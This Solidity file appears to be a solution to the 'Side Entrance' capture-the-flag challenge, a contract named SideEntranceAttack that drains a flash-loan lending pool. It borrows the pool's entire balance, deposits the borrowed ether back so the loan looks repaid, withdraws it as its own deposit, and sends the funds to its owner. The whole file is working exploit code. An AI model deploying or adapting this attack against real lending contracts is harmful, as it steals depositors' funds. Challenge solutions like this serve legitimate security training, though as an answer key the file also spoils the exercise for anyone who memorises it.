// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";


interface ISideEntranceLenderPool {
     function deposit() external payable;
     function withdraw() external;
     function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    ISideEntranceLenderPool pool;
    address private immutable owner;

    constructor(address payable _poolAddress) {
        pool = ISideEntranceLenderPool(_poolAddress);
        owner = msg.sender;
    }

    function attack() external {
        // flashLoan all the balance of the contract 
        pool.flashLoan(address(pool).balance);   
        pool.withdraw();   
    }

    function execute() external payable {
        // withdraw all the balance of the contract
        pool.deposit{value: msg.value}();
    }
    receive() external payable {
       payable(owner).transfer(address(this).balance);
    }
}